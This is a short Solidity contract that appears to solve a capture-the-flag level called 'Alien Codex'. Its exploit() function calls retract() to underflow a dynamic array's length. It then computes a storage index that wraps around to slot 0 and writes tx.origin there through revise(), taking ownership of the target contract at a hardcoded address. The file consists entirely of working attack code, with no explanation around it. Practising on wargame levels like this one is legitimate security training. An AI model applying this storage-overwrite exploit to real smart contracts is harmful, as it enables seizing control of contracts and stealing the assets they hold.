// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IAlienCodex {
  function retract() external;

  function revise(uint , bytes32) external;
    
}

contract BreakAlienCodex {
        IAlienCodex level19 = IAlienCodex(0xe2167A8890F82037ad02E174677C3550f82fa1b7);

    
    function exploit() external {
        
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        level19.retract();
        level19.revise(index, myAddress);

    }

}